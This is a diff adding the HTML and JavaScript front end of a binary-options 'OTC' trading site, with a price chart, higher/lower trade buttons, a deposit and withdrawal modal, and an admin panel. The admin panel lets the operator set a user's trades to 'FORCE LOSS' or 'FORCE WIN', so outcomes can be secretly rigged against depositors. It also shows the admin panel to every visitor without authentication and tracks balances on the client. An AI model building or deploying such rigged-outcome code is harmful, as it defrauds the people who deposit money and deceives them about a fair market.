@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PRO-TRADE OTC | Global Trading Platform</title>
+  <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
+  <script src="/socket.io/socket.io.js"></script>
+  
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    body { background: #0b0e14; color: #ffffff; overflow-x: hidden; }
+
+    .glass-card {
+      background: rgba(23, 27, 38, 0.75);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+    }
+
+    header {
+      height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .brand { font-size: 20px; font-weight: bold; color: #00e676; display: flex; align-items: center; gap: 8px; }
+    .balance-box { background: #1a2130; padding: 8px 16px; border-radius: 20px; font-weight: 600; color: #00e676; border: 1px solid #00e67644; }
+    .nav-btn { background: #293249; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; transition: 0.2s; }
+    .nav-btn:hover { background: #3b4868; }
+
+    .container { display: grid; grid-template-columns: 1fr 320px; height: calc(100vh - 60px); }
+    #chart-container { width: 100%; height: 100%; position: relative; }
+
+    .control-panel { padding: 20px; display: flex; flex-direction: column; gap: 20px; border-left: 1px solid rgba(255, 255, 255, 0.08); }
+    .input-group { display: flex; flex-direction: column; gap: 8px; }
+    .input-group label { font-size: 12px; color: #848e9c; }
+    .input-field { background: #181c27; border: 1px solid #2b313a; color: white; padding: 12px; border-radius: 8px; font-size: 16px; outline: none; }
+    
+    .trade-btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+    .btn-call { background: #00c853; color: white; }
+    .btn-call:hover { background: #00e676; }
+    .btn-put { background: #ff1744; color: white; }
+    .btn-put:hover { background: #ff5252; }
+
+    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; justify-content: center; align-items: center; }
+    .modal-content { width: 450px; padding: 25px; }
+    .close-btn { float: right; cursor: pointer; font-size: 20px; color: #848e9c; }
+    .tab-container { display: flex; gap: 10px; margin-bottom: 20px; }
+    .tab { flex: 1; text-align: center; padding: 10px; background: #1a2130; border-radius: 6px; cursor: pointer; }
+    .tab.active { background: #00e676; color: black; font-weight: bold; }
+
+    .admin-stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+    .stat-card { padding: 15px; background: #131722; border-radius: 8px; text-align: center; }
+    .stat-value { font-size: 22px; font-weight: bold; color: #00e676; margin-top: 5px; }
+
+    @media (max-width: 768px) {
+      .container { grid-template-columns: 1fr; grid-template-rows: 1fr auto; }
+      .control-panel { height: 260px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="glass-card">
+    <div class="brand">📈 PRO-TRADE OTC</div>
+    <div style="display: flex; gap: 10px; align-items: center;">
+      <div class="balance-box">Balance: $<span id="user-balance">1000.00</span></div>
+      <button class="nav-btn" onclick="openModal('wallet-modal')">Deposit/Withdraw</button>
+      <button class="nav-btn" style="background: #e91e63;" onclick="openAdminRoom()">Admin Panel</button>
+    </div>
+  </header>
+
+  <div class="container">
+    <div id="chart-container"></div>
+
+    <div class="control-panel glass-card">
+      <div class="input-group">
+        <label>Timeframe</label>
+        <select id="trade-time" class="input-field">
+          <option value="60">1 Minute (60s)</option>
+          <option value="120">2 Minutes (120s)</option>
+          <option value="300">5 Minutes (300s)</option>
+        </select>
+      </div>
+
+      <div class="input-group">
+        <label>Investment Amount ($)</label>
+        <input type="number" id="trade-amount" class="input-field" value="10" min="1">
+      </div>
+
+      <button class="trade-btn btn-call" onclick="placeTrade('CALL')">HIGHER ▲</button>
+      <button class="trade-btn btn-put" onclick="placeTrade('PUT')">LOWER ▼</button>
+      <div id="trade-status" style="font-size: 12px; text-align: center; color: #848e9c;">Market Syncing...</div>
+    </div>
+  </div>
+
+  <!-- Wallet Modal -->
+  <div id="wallet-modal" class="modal">
+    <div class="modal-content glass-card">
+      <span class="close-btn" onclick="closeModal('wallet-modal')">&times;</span>
+      <div class="tab-container">
+        <div class="tab active" id="tab-dep" onclick="switchWalletTab('dep')">Deposit ($5 Min)</div>
+        <div class="tab" id="tab-with" onclick="switchWalletTab('with')">Withdraw ($10 Min)</div>
+      </div>
+
+      <div id="deposit-section">
+        <div class="input-group" style="margin-bottom: 12px;">
+          <label>Amount ($5 Minimum)</label>
+          <input type="number" id="dep-amount" class="input-field" placeholder="5.00" min="5">
+        </div>
+        <button class="trade-btn btn-call" onclick="submitDeposit()">Deposit Now</button>
+      </div>
+
+      <div id="withdraw-section" style="display: none;">
+        <div class="input-group" style="margin-bottom: 12px;">
+          <label>Amount ($10 Minimum)</label>
+          <input type="number" id="with-amount" class="input-field" placeholder="10.00" min="10">
+        </div>
+        <button class="trade-btn btn-put" onclick="submitWithdraw()">Withdraw Now</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Admin Control Room Modal -->
+  <div id="admin-modal" class="modal">
+    <div class="modal-content glass-card" style="width: 500px;">
+      <span class="close-btn" onclick="closeModal('admin-modal')">&times;</span>
+      <h2 style="margin-bottom: 15px; color: #00e676;">Admin Master Control</h2>
+
+      <div class="admin-stat-grid">
+        <div class="stat-card">
+          <div>1h Deposit</div>
+          <div class="stat-value" id="stat-1h-dep">$0.00</div>
+        </div>
+        <div class="stat-card">
+          <div>1h Withdraw</div>
+          <div class="stat-value" style="color: #ff1744;" id="stat-1h-with">$0.00</div>
+        </div>
+        <div class="stat-card">
+          <div>24h Deposit</div>
+          <div class="stat-value" id="stat-24h-dep">$0.00</div>
+        </div>
+        <div class="stat-card">
+          <div>24h Net Profit</div>
+          <div class="stat-value" id="stat-24h-profit">$0.00</div>
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label>Target User Override Strategy</label>
+        <select id="admin-user-mode" class="input-field" onchange="setAdminUserMode()">
+          <option value="AUTO">AUTO (Natural System Algorithm)</option>
+          <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
+          <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const socket = io(); // Automatically connects to the current host
+    let currentUserId = "USER_101";
+    let currentBalance = 1000.00;
+
+    const chartContainer = document.getElementById('chart-container');
+    const chart = LightweightCharts.createChart(chartContainer, {
+      layout: { backgroundColor: '#0b0e14', textColor: '#d1d4dc' },
+      grid: { vertLines: { color: 'rgba(42, 46, 57, 0.4)' }, horzLines: { color: 'rgba(42, 46, 57, 0.4)' } },
+      crosshair: { mode: LightweightCharts.CrosshairMode.Normal },
+      timeScale: { timeVisible: true, secondsVisible: true }
+    });
+
+    const candleSeries = chart.addCandlestickSeries({
+      upColor: '#00c853', downColor: '#ff1744',
+      borderUpColor: '#00c853', borderDownColor: '#ff1744',
+      wickUpColor: '#00c853', wickDownColor: '#ff1744'
+    });
+
+    let currentCandle = null;
+
+    socket.on('price_tick', (data) => {
+      const time = Math.floor(data.timestamp / 1000);
+      const price = data.price;
+
+      if (!currentCandle || Math.floor(currentCandle.time / 60) !== Math.floor(time / 60)) {
+        currentCandle = { time: time, open: price, high: price, low: price, close: price };
+      } else {
+        currentCandle.high = Math.max(currentCandle.high, price);
+        currentCandle.low = Math.min(currentCandle.low, price);
+        currentCandle.close = price;
+      }
+
+      candleSeries.update(currentCandle);
+    });
+
+    function placeTrade(type) {
+      const amount = parseFloat(document.getElementById('trade-amount').value);
+      const durationSec = parseInt(document.getElementById('trade-time').value);
+
+      if (amount > currentBalance) { alert("Insufficient balance!"); return; }
+
+      currentBalance -= amount;
+      document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+
+      socket.emit('place_trade', {
+        userId: currentUserId, type: type, amount: amount, durationSec: durationSec
+      });
+
+      document.getElementById('trade-status').innerText = `Active Trade (${type}) Running...`;
+    }
+
+    socket.on('trade_result', (res) => {
+      if (res.isWin) {
+        currentBalance += res.payout;
+        alert(`TRADE WIN! Payout: $${res.payout.toFixed(2)}`);
+      } else {
+        alert(`TRADE LOSS!`);
+      }
+      document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+      document.getElementById('trade-status').innerText = "Market Syncing...";
+    });
+
+    function openAdminRoom() {
+      fetch('/api/admin/stats')
+        .then(r => r.json())
+        .then(data => {
+          document.getElementById('stat-1h-dep').innerText = '$' + data.dep1h;
+          document.getElementById('stat-1h-with').innerText = '$' + data.with1h;
+          document.getElementById('stat-24h-dep').innerText = '$' + data.dep24h;
+          document.getElementById('stat-24h-profit').innerText = '$' + data.profit24h;
+          openModal('admin-modal');
+        });
+    }
+
+    function setAdminUserMode() {
+      const mode = document.getElementById('admin-user-mode').value;
+      socket.emit('admin_set_user_mode', { userId: currentUserId, mode: mode });
+    }
+
+    function submitDeposit() {
+      const amt = parseFloat(document.getElementById('dep-amount').value);
+      if (isNaN(amt) || amt < 5) { alert("Minimum deposit is $5"); return; }
+      fetch('/api/deposit', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ amount: amt })
+      }).then(() => {
+        currentBalance += amt;
+        document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+        alert("Deposit successful!");
+        closeModal('wallet-modal');
+      });
+    }
+
+    function submitWithdraw() {
+      const amt = parseFloat(document.getElementById('with-amount').value);
+      if (isNaN(amt) || amt < 10) { alert("Minimum withdrawal is $10"); return; }
+      if (amt > currentBalance) { alert("Insufficient balance!"); return; }
+      fetch('/api/withdraw', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ amount: amt })
+      }).then(() => {
+        currentBalance -= amt;
+        document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+        alert("Withdrawal requested!");
+        closeModal('wallet-modal');
+      });
+    }
+
+    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+    function switchWalletTab(tab) {
+      if(tab === 'dep') {
+        document.getElementById('deposit-section').style.display = 'block';
+        document.getElementById('withdraw-section').style.display = 'none';
+        document.getElementById('tab-dep').classList.add('active');
+        document.getElementById('tab-with').classList.remove('active');
+      } else {
+        document.getElementById('deposit-section').style.display = 'none';
+        document.getElementById('withdraw-section').style.display = 'block';
+        document.getElementById('tab-with').classList.add('active');
+        document.getElementById('tab-dep').classList.remove('active');
+      }
+    }
+  </script>
+</body>
+</html>
